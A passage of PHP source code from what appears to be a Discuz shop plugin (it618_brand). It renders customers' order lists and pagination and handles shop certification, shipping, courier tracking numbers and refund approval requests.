				if($it618_brand_sale['it618_addr']!='')$it618_addr=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_brand_sale['it618_addr'].'\')">'.it618_brand_getlang('s1251').'</a>';
				$saletypestr=it618_brand_getlang('s1246').$it618_addr;
			}
			if($it618_brand_sale['it618_saletype']==3)$saletypestr=it618_brand_getlang('s1247');
			
			if($it618_brand_sale['it618_saletype']==5)$saletypestr=it618_brand_getlang('s1658');
			
			if($it618_brand_sale['it618_saletype']==6)$saletypestr=it618_brand_getlang('s857').' <font color=red>'.$it618_brand_sale['it618_prepaybl'].'</font>%';
			
			if($it618_brand_sale['it618_saletype']==6){
				$prepaybl=$it618_brand_sale['it618_prepaybl']/100;
			}else{
				$prepaybl=1;
			}
			
			if($it618_brand_sale['it618_type']==1){
				$it618_type=''.it618_brand_getlang('s1149').' '.$saletypestr.'<br><font color="#999">'.$creditname.'-'.($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']+$it618_brand_sale['it618_yunfei']).'</font>';
				$hejimoney=$it618_brand_sale['it618_sfscore'];
				
				$zkstr='';	
				
				if($it618_brand_sale['it618_vipzk']>0){
					$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
				}
				
				$hejistr=$hejimoney.' '.$creditname.' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']).$zkstr.' '.$creditname.' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.$creditname;
			
				$heji='<font color="red">'.$hejimoney.'</font> '.$creditname.'<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a>';
			}else{
				$it618_brand_money = C::t('#it618_brand#it618_brand_money')->fetch_by_saleid($it618_brand_sale['id']);
				if($it618_brand_sale['it618_gwcid']>0){
					$typestr=$it618_brand_lang['t192'].':<font color="#FF3300"><b>'.$it618_brand_sale['it618_gwcid'].'</b></font>';
				}else{
					$typestr=it618_brand_getlang('s1150');
				}
				
				$zsstr='';
				if($it618_brand_sale['it618_state']==2){
					$zsstr='<font color="green">'.$creditname.'+'.($it618_brand_money['it618_score']).'</font>';
				}
				$it618_type=''.$typestr.' '.$saletypestr.'<br><font color="green" title="'.it618_brand_getlang('s927').'">'.$it618_brand_sale['it618_alipaybl'].'%</font> '.$zsstr;
				
				$hejimoney=$it618_brand_sale['it618_sfmoney'];
				if($hejimoney<0)$hejimoney=0;
				if($hejimoney==0)$isdjq=1;
				$zkstr='';	
				if($it618_brand_sale['it618_zk']!=100){
					$zkstr=' * '.$it618_brand_sale['it618_zk'].'%('.$it618_brand_lang['t799'].')';
				}
				
				if($it618_brand_sale['it618_vipzk']>0){
					$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
				}
				
				$hejistr=$hejimoney.' '.it618_brand_getlang('s389').' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_price']*$it618_brand_sale['it618_count']*$prepaybl).$zkstr.' '.it618_brand_getlang('s389').' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.it618_brand_getlang('s389').' - '.it618_brand_getlang('s928').$it618_brand_sale['it618_quanmoney'].' '.it618_brand_getlang('s389');
				
				if($IsCredits==1){
					$paystr=getpaystr($it618_brand_sale['it618_gwcid'],$it618_brand_sale['id'],'brand');
				}
				
				$heji='<font color="red">'.$hejimoney.'</font> '.it618_brand_getlang('s389').'<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a> <a href="javascript:" class="saleabtn" onclick="alert(\''.$paystr.'\')">'.$it618_brand_lang['s1799'].'</a>';
			}
			
			if($it618_brand_sale['it618_state']==1){
				if($it618_brand_sale['it618_saletype']==1||$it618_brand_sale['it618_saletype']==6){
					if($isdjq==1)$tuikuanstr='';else $tuikuanstr=' <a href="javascript:" class="saleabtn" onclick="tuikuan('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1120').'</a>';
					
					$it618_state.=$tuikuanstr.'<br>'.it618_brand_getlang('s1243').''.it618_brand_getlang('s1217').'<b><font color=green>'.$it618_brand_sale['it618_code'].'</font></b>';
					
				}elseif($it618_brand_sale['it618_saletype']==2){
					if($it618_brand_sale['it618_kddan']==''){
						$it618_fahuo=it618_brand_getlang('s1158');
					}else{
						$it618_fahuo=it618_brand_getlang('s1152').' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1250').'</a> ';	
					}
					
					if($it618_brand_sale['it618_state_tuihuo']==0){
						$it618_state.=' '.$it618_fahuo.' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1153').'</a>';
					}
					if($it618_brand_sale['it618_state_tuihuo']==1){
						$it618_state.=' '.it618_brand_getlang('s1154');
					}
					if($it618_brand_sale['it618_state_tuihuo']==2){
						$it618_state.=' '.it618_brand_getlang('s1155');
					}
					if($it618_brand_sale['it618_state_tuihuo']==3){
						if($it618_brand_sale['it618_kddan']==''){
							$it618_fahuo=' '.it618_brand_getlang('s1158');
						}else{
							$it618_fahuo=' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1250').'</a> ';	
						}
						
						if($isdjq==1)$tuikuanstr='';else $tuikuanstr=' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1153').'</a>';
						$it618_state.=' '.it618_brand_getlang('s1157').$it618_fahuo.$tuikuanstr;
					}
				}
			}
			
			if($it618_brand_sale['it618_saletype']==3){
				$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="setsalekm('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1244').'</a>';
			}
			
			if($it618_brand_sale['it618_saletype']==5){
				$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="setsalecontend('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1145').'</a>';
			}
			
			$it618_kddan='';
			if($it618_brand_sale['it618_kddan']!=''){
				$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_sale['it618_kdid']);
				$it618_kddan='<br><font color="#999">'.it618_brand_getlang('s1159').'</font><span title="'.$it618_brand_sale['it618_bz'].'">'.$it618_brand_kd['it618_name'].' '.it618_brand_getkd('it618_brand_sale',$it618_brand_sale['id'],$it618_brand_kd['it618_kdcomid'],$it618_brand_sale['it618_kddan']).'</span>';
			}
			
			$it618_state.=$it618_kddan;
			
			$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_sale['it618_shopid']);
			
			$disabled='';
			if($it618_brand_sale['it618_state']!=1)$disabled='disabled="disabled"';
			
			if($isgoodsdel==0){
				$tmpurl1=it618_brand_getrewrite('shop_product',$it618_brand_sale['it618_shopid'].'@'.$it618_brand_sale['it618_pid'],'plugin.php?id=it618_brand:product&sid='.$it618_brand_sale['it618_shopid'].'&pid='.$it618_brand_sale['it618_pid']);
				$goodsstr='<a href="'.$tmpurl1.'" target="_blank" title="'.$goodsname.'">'.cutstr($goodsname,40,'...').'</a>';
			}else{
				$goodsstr=cutstr($goodsname,40,'...');
			}
			
			$tmpurl2=it618_brand_getrewrite('shop_home',$it618_brand_brand['id'],'plugin.php?id=it618_brand:shop&sid='.$it618_brand_brand['id']);
			$mysalelist_get.='<tr class="hover">
						<td><input class="checkbox" type="checkbox" id="chk'.$it618_brand_sale[id].'" name="chk_sel" value="'.$it618_brand_sale[id].'" '.$disabled.'><label for="chk'.$it618_brand_sale[id].'">'.$it618_brand_sale[id].'</label></td>
						<td>'.$goodsstr.'<br>'.$gtypename.' <a href="'.$tmpurl2.'" target="_blank"><font color="#ccc">'.$it618_brand_brand['it618_name'].'</font></a></td>
						<td>'.$it618_brand_sale['it618_count'].'</td>
						<td>'.$heji.'</td>
						<td>'.$it618_type.'</td>
						<td>'.$it618_state.'</td>
						<td><font color="#999">'.date('Y-m-d H:i:s', $it618_brand_sale['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmysale'){
			$isdjq=0;
			if($it618_brand_sale['it618_saletype']==1)$saletypestr=it618_brand_getlang('s1245');
			if($it618_brand_sale['it618_saletype']==2){
				if($it618_brand_sale['it618_addr']!='')$it618_addr=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_brand_sale['it618_addr'].'\')">'.it618_brand_getlang('s1251').'</a>';
				$saletypestr=it618_brand_getlang('s1246').$it618_addr;
			}

			if($it618_brand_sale['it618_saletype']==3)$saletypestr=it618_brand_getlang('s1247').' <a href="javascript:" class="saleabtn" onclick="setsalekm('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1244').'</a>';
			
			if($it618_brand_sale['it618_saletype']==5)$saletypestr=it618_brand_getlang('s1658').' <a href="javascript:" class="saleabtn" onclick="setsalecontend('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1145').'</a>';
			
			if($it618_brand_sale['it618_saletype']==6)$saletypestr=it618_brand_getlang('s857').' <font color=red>'.$it618_brand_sale['it618_prepaybl'].'</font>%';
			
			if($it618_brand_sale['it618_saletype']==6){
				$prepaybl=$it618_brand_sale['it618_prepaybl']/100;
			}else{
				$prepaybl=1;
			}
			if($it618_brand_sale['it618_type']==1){
				$it618_type=it618_brand_getlang('s1149').' '.$saletypestr.' <font color="#999">'.$creditname.'-'.($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']+$it618_brand_sale['it618_yunfei']).'</font>';
				$hejimoney=$it618_brand_sale['it618_sfscore'];
				
				$zkstr='';	
				
				if($it618_brand_sale['it618_vipzk']>0){
					$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
				}
				
				$hejistr=$hejimoney.' '.$creditname.' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_score']*$it618_brand_sale['it618_count']).$zkstr.' '.$creditname.' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.$creditname;
			
				$heji='<font color="red">'.$hejimoney.'</font> '.$creditname.' <a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a>';
			}else{
				$it618_brand_money = C::t('#it618_brand#it618_brand_money')->fetch_by_saleid($it618_brand_sale['id']);
				if($it618_brand_sale['it618_gwcid']>0){
					$typestr=$it618_brand_lang['t192'].':<font color="#FF3300"><b>'.$it618_brand_sale['it618_gwcid'].'</b></font>';
				}else{
					$typestr=it618_brand_getlang('s1150');
				}
				$zsstr='';
				if($it618_brand_sale['it618_state']==2&&$it618_brand_money['it618_score']>0){
					$zsstr='<br><font color="#999" title="'.it618_brand_getlang('s927').'">'.$it618_brand_sale['it618_alipaybl'].'%</font> <font color="#999">'.$creditname.'+'.($it618_brand_money['it618_score']).'</font>';
				}
				
				$it618_type=''.$typestr.' '.$saletypestr.' '.$zsstr;
				$hejimoney=$it618_brand_sale['it618_sfmoney'];
				if($hejimoney<0)$hejimoney=0;
				if($hejimoney==0)$isdjq=1;
				$zkstr='';	
				if($it618_brand_sale['it618_zk']!=100){
					$zkstr=' * '.$it618_brand_sale['it618_zk'].'%('.$it618_brand_lang['t799'].')';
				}
				
				if($it618_brand_sale['it618_vipzk']>0){
					$zkstr.=' * '.$it618_brand_sale['it618_vipzk'].'%('.$it618_brand_lang['t798'].')';
				}
				
				$hejistr=$hejimoney.' '.it618_brand_getlang('s389').' = '.it618_brand_getlang('s921').($it618_brand_sale['it618_price']*$it618_brand_sale['it618_count']*$prepaybl).$zkstr.' '.it618_brand_getlang('s389').' + '.it618_brand_getlang('s922').$it618_brand_sale['it618_yunfei'].' '.it618_brand_getlang('s389').' - '.it618_brand_getlang('s928').$it618_brand_sale['it618_quanmoney'].' '.it618_brand_getlang('s389');
				
				if($IsCredits==1){
					$paystr=getpaystr($it618_brand_sale['it618_gwcid'],$it618_brand_sale['id'],'brand');
				}
				
				$heji=''.$hejimoney.' '.it618_brand_getlang('s389').'<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$hejistr.'\')">'.$it618_brand_lang['s1803'].'</a> <a href="javascript:" class="saleabtn" onclick="alert(\''.$paystr.'\')">'.$it618_brand_lang['s1799'].'</a>';
			}
			
			$it618_statebtn='';
			if($it618_brand_sale['it618_state']==1){
				if($it618_brand_sale['it618_saletype']==1||$it618_brand_sale['it618_saletype']==6){
					if($isdjq==1)$tuikuanstr='';else $tuikuanstr=' <a href="javascript:" class="saleabtn" onclick="tuikuan('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1120').'</a>';
					$it618_statebtn.=$tuikuanstr.' '.it618_brand_getlang('s1002').''.it618_brand_getlang('s1217').'<font color=green>'.$it618_brand_sale['it618_code'].'</font>';
					
				}elseif($it618_brand_sale['it618_saletype']==2){
					if($it618_brand_sale['it618_kddan']==''){
						$it618_fahuo=it618_brand_getlang('s1158');
					}else{
						$it618_fahuo=it618_brand_getlang('s1152').' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1250').'</a> ';	
					}
					
					if($it618_brand_sale['it618_state_tuihuo']==0){
						$it618_state.=' '.$it618_fahuo.' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1153').'</a>';
					}
					if($it618_brand_sale['it618_state_tuihuo']==1){
						$it618_state.=' '.it618_brand_getlang('s1154');
					}
					if($it618_brand_sale['it618_state_tuihuo']==2){
						$it618_state.=' '.it618_brand_getlang('s1155');
					}
					if($it618_brand_sale['it618_state_tuihuo']==3){
						if($it618_brand_sale['it618_kddan']==''){
							$it618_fahuo=' '.it618_brand_getlang('s1158');
						}else{
							$it618_fahuo=' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1250').'</a> ';	
						}
						
						if($isdjq==1)$tuikuanstr='';else $tuikuanstr=' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_brand_sale['id'].')">'.it618_brand_getlang('s1153').'</a>';
						$it618_state.=' '.it618_brand_getlang('s1157').$it618_fahuo.$tuikuanstr;
					}
				}
			}
			
			$it618_kddan='';
			if($it618_brand_sale['it618_kddan']!=''){
				$it618_brand_kd=C::t('#it618_brand#it618_brand_kd')->fetch_by_id($it618_brand_sale['it618_kdid']);
				$it618_kddan='<br><font color="#999">'.it618_brand_getlang('s1162').'</font><span title="'.$it618_brand_sale['it618_bz'].'">'.$it618_brand_kd['it618_name'].' '.it618_brand_getkd('it618_brand_sale',$it618_brand_sale['id'],$it618_brand_kd['it618_kdcomid'],$it618_brand_sale['it618_kddan']).'</span>';
			}
			
			if($it618_statebtn!='')$it618_statebtn='<br>'.$it618_statebtn;
			$it618_statebtn.=$it618_kddan;
			
			if($isgoodsdel==0){
				$tmpurl=it618_brand_getrewrite('brand_wap','product@'.$it618_brand_sale['it618_shopid'].'@0@'.$it618_brand_sale['it618_pid'].'@0','plugin.php?id=it618_brand:wap&pagetype=product&sid='.$it618_brand_sale['it618_shopid'].'&cid='.$it618_brand_sale['it618_pid']);
				$goodsstr='<a href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$goodsname.'</a>';
				$imgstr='<a href="'.$tmpurl.'" target="_blank"><img class="lazy" data-original="'.it618_brand_getgoodspic($it618_brand_goods['it618_shopid'],$it618_brand_goods['id'],$it618_brand_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>';
			}else{
				$goodsstr='<span style="font-size:14px;color:#333">'.$goodsname.'</span>';
				$imgstr='<img src="source/plugin/it618_brand/images/nogoods.png" width="108" height="108" style="border-radius: 3px;"/>';
			}
			
			$mysalelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							'.$imgstr.'
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none">
							'.$goodsstr.'<br>
							ID:'.$it618_brand_sale['id'].' '.$gtypename1.''.it618_brand_getlang('s1164').''.$it618_brand_sale['it618_count'].'<br>'.$it618_type.'<br>'.it618_brand_getlang('s1165').$heji.'<br>'.$it618_statebtn.'<br>'.it618_brand_getlang('s1167').''.$it618_state.'<br><font color=#ccc>'.date('Y-m-d H:i:s', $it618_brand_sale['it618_time']).'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}

	if($_GET['ac1']=='pcmysale'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_brand:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s708').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_brand_getlang('s709').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s709').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_brand:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_brand_getlang('s708').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_brand_getlang('s709').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$money=C::t('#it618_brand#it618_brand_sale')->sum_it618_price_by_shopid(0,"s.it618_type=2 ".$it618sql,'',$_GET['pname'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	if($money=='')$money=0;
	$score=C::t('#it618_brand#it618_brand_sale')->sum_it618_score_by_shopid(0,"s.it618_type=1 ".$it618sql,'',$_GET['pname'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	$score1=C::t('#it618_brand#it618_brand_sale')->sum_it618_score1_by_shopid(0,"s.it618_type=2 ".$it618sql,'',$_GET['pname'],$uid, $_GET['it618_time1'], $_GET['it618_time2']);
	if($score=='')$score=0;
	if($score1=='')$score1=0;
	$score=str_replace(".00","",$score);
	
	echo ''.it618_brand_getlang('s1168').''."<font color=red>$count</font> ".it618_brand_getlang('s1169')."<font color=red>$money</font> ".it618_brand_getlang('s389')." ".it618_brand_getlang('s1170')."<font color=red>$score</font> ".$creditname." ".it618_brand_getlang('s1171')."<font color=red>$score1</font> ".$creditname."it618_split".$mysalelist_get."it618_split".$multipage;
}


if($_GET['ac']=="renzheng"){
	$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
	$brand_rzpower=(array)unserialize($it618_brand['brand_rzpower']);
	$okvipgroupids=it618_brand_getisvipuser($brand_rzpower);
	
	if($uid<=0){
		echo it618_brand_getlang('s171');exit;
	}elseif(count($okvipgroupids[0])==0){
		echo it618_brand_getlang('s497');exit;
	}elseif($it618_brand['brand_iscert']==1){
		if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/plugins/image/images/it618.png')){
			if(C::t('#it618_members#it618_members_qyrz')->count_by_uid_rzok($uid)==0){
				echo $it618_brand['brand_rzcerttip'];exit;
			}
		}
	}
		
	if($it618_brand['brand_mode']!=2){
		$it618_class_id=$_GET['it618_class_id'];
		$it618_class1_id=$_GET['it618_class_id1'];
	}else{
		foreach(C::t('#it618_brand#it618_brand_brand_class')->fetch_all_by_search() as $it618_tmp) {
			$it618_class_id=$it618_tmp['id'];
			break;
		}
		foreach(C::t('#it618_brand#it618_brand_brand_class1')->fetch_all_by_it618_class_id($it618_class_id) as $it618_tmp) {
			$it618_class1_id=$it618_tmp['id'];
			break;
		}	
	}
	
	$it618_state=0;
	if($IsGroup==1){
		if($it618_group_rzmoney=C::t('#it618_group#it618_group_rzmoney')->fetch_by_shoptype_lid('brand',$_GET['it618_power'])){
			if($it618_group_rzmoney['it618_isautocheck']==1){
				if($it618_group_group_user=C::t('#it618_group#it618_group_group_user')->fetch_by_groupid_uid($it618_group_rzmoney['it618_groupid'],$uid)){
					if($_G['timestamp']<$it618_group_group_user['it618_etime']){
						$it618_state=2;
					}
				}
			}
		}
	}
	
	$count = C::t('#it618_brand#it618_brand_brand')->count_by_it618_uid($uid);
	if($ii1i11i[3]!='1')return;
	if($count==0){
		$id = C::t('#it618_brand#it618_brand_brand')->insert(array(
			'it618_uid' => $uid,
			'it618_area_id' => $_GET['it618_area_id'],
			'it618_area1_id' => $_GET['it618_area_id1'],
			'it618_class_id' => $it618_class_id,
			'it618_class1_id' => $it618_class1_id,
			'it618_power' => $_GET['it618_power'],
			'it618_logo' => $it618_brand['brand_shoplogo'],
			'it618_name' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_name'])),
			'it618_tel' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_tel'])),
			'it618_qq' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_qq'])),
			'it618_addr' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_addr'])),
			'it618_liyou' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_liyou'])),
			'it618_state' => $it618_state,
			'it618_time' => $_G['timestamp']
		), true);
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
	}else{
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[7]!='r')return;
		$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_uid($uid);
		C::t('#it618_brand#it618_brand_brand')->update($it618_brand_brand['id'],array(
			'it618_area_id' => $_GET['it618_area_id'],
			'it618_area1_id' => $_GET['it618_area_id1'],
			'it618_class_id' => $it618_class_id,
			'it618_class1_id' => $it618_class1_id,
			'it618_power' => $_GET['it618_power'],
			'it618_name' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_name'])),
			'it618_tel' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_tel'])),
			'it618_qq' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_qq'])),
			'it618_addr' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_addr'])),
			'it618_liyou' => it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_liyou'])),
			'it618_state' => $it618_state,
			'it618_time' => $_G['timestamp']
		));
		$id = $it618_brand_brand['id'];
		if(count($ii1i11i)!=11)return;
	}
	
	if($id>0){
		if($it618_state==2){
			$tomonth = date('n'); 
			$todate = date('j'); 
			$toyear = date('Y');
			$it618_htetime=mktime(0, 0, 0, $tomonth+$it618_brand['brand_httimecount'], $todate, $toyear);
		
			C::t('#it618_brand#it618_brand_brand')->update_pass_by_id($id,$it618_htetime,$_G['timestamp']);
			it618_brand_initshop($id,it618_brand_utftogbk(dhtmlspecialchars($_GET['it618_name'])));
			
			$it618_brand_brandgroup = C::t('#it618_brand#it618_brand_brandgroup')->fetch_by_id($_GET['it618_power']);
			if($it618_brand_brandgroup['it618_isgoods']==1){
				C::t('#it618_brand#it618_brand_show')->update_it618_power_by_shopid($id,1);
			}else{
				C::t('#it618_brand#it618_brand_show')->update_it618_power_by_shopid($id,0);
			}
			
			if($it618_brand_brandgroup['it618_isgoods']==0&&$it618_brand_brandgroup['it618_issaleout']==0){
				C::t('#it618_brand#it618_brand_show')->update_it618_power1_by_shopid($id,0);
			}else{
				C::t('#it618_brand#it618_brand_show')->update_it618_power1_by_shopid($id,1);
			}
			
			C::t('#it618_brand#it618_brand_brand')->update_it618_filespace_by_id($id,10);
			it618_brand_setshopsize($id,10);
			$tmpurl=it618_brand_getrewrite('shop_sc','','plugin.php?id=it618_brand:sc');
			echo 'it618_splitvipokit618_split'.$tmpurl;
		}else{
			it618_brand_sendmessage('rz_admin',$id);
			echo 'it618_splitok';
		}
	}
	exit;
}


if($_GET['ac']=="fahuo"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['ac2'])){
			$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxssale',$uid,$ShopId);
			if($count==0){
				echo 'it618_split'.$it618_brand_lang['s1699'];exit;
			}
		}else{
			if(isset($_GET['adminsid'])){
				$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
				if(!in_array($_G['uid'],$shopadmin)){
					echo 'it618_split'.it618_brand_getlang('s1220');exit;
				}
			}else{
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
				if($it618_brand_brand['it618_uid']!=$uid){
					echo 'it618_split'.it618_brand_getlang('s671');exit;
				}
			}
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		it618_brand_qrxf($_GET['saleid']);
		
		if(isset($_GET['ac2'])){
			$it618_brand_sale=C::t('#it618_brand#it618_brand_sale')->fetch_by_id($_GET['saleid']);
			if($it618_brand_sale['it618_saletype']==6){
				it618_brand_yuangongsale($ShopId,$uid,1,$_GET['saleid'],$it618_brand_lang['s1780'],$_G['timestamp']);
			}else{
				it618_brand_yuangongsale($ShopId,$uid,1,$_GET['saleid'],$it618_brand_lang['s1781'],$_G['timestamp']);
			}
		}
		
		echo 'okit618_split'.it618_brand_getlang('s1179');exit;
	}
}


if($_GET['ac']=="savekd"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['ac2'])){
			$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxssale',$uid,$ShopId);
			if($count==0){
				echo 'it618_split'.$it618_brand_lang['s1699'];exit;
			}
		}else{
			if(isset($_GET['adminsid'])){
				$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
				if(!in_array($_G['uid'],$shopadmin)){
					echo 'it618_split'.it618_brand_getlang('s1220');exit;
				}
			}else{
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
				if($it618_brand_brand['it618_uid']!=$uid){
					echo 'it618_split'.it618_brand_getlang('s671');exit;
				}
			}
		}
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		C::t('#it618_brand#it618_brand_sale')->update($_GET['saleid'],array(
			'it618_kdid' => $_GET['it618_kdid'],
			'it618_kddan' => $_GET['it618_kddan']
		));
		
		it618_brand_sendmessage('sale2state_user',$_GET['saleid'],'fahuo');
		
		if(isset($_GET['ac2']))it618_brand_yuangongsale($ShopId,$uid,1,$_GET['saleid'],$it618_brand_lang['s1782'],$_G['timestamp']);
		
		echo 'okit618_split'.it618_brand_getlang('s728');exit;
	}
}


if($_GET['ac']=="tongyitui"){
	if($uid<=0){
		echo 'it618_split'.it618_brand_getlang('s671');exit;
	}else{
		if(isset($_GET['ac2'])){
			$count=C::t('#it618_brand#it618_brand_yuangong')->count_by_uid_shopid('it618_isxssale',$uid,$ShopId);
			if($count==0){
				echo 'it618_split'.$it618_brand_lang['s1699'];exit;
			}
		}else{
			if(isset($_GET['adminsid'])){
				$shopadmin=explode(",",$it618_brand['brand_shopadmin']);
				if(!in_array($_G['uid'],$shopadmin)){
					echo 'it618_split'.it618_brand_getlang('s1220');exit;
				}
			}else{
				$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($_GET['sid']);
				if($it618_brand_brand['it618_uid']!=$uid){
					echo 'it618_split'.it618_brand_getlang('s671');exit;
				}
			}
		}
		
		$saleid=intval($_GET['saleid']);
	
		C::t('#it618_brand#it618_brand_sale')->update($_GET['saleid'],array(
			'it618_state_tuihuo' => 2,
			'it618_state' => 3
		));
		
		if($IsCredits==1&&$it618_brand['brand_tktype']==1){
			$it618_brand_sale = DB::fetch_first("SELECT * FROM ".DB::table('it618_brand_sale')." where id=".$saleid);
			$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_sale['it618_shopid']);
			
			C::t('#it618_brand#it618_brand_sale')->update_it618_state($saleid,4);
